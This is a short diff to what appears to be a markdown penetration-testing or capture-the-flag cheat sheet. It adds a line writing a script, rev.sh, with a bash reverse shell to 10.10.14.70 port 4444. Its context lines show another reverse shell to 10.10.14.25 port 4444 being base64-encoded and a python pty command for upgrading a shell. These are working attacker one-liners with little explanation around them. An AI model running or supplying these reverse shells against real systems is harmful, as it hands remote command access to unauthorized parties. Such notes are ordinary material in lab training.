@@ -5,6 +5,9 @@
 ```bash
 echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
 ```
+```bash
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+```
 ##### Upgrade shell to fully interactive:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
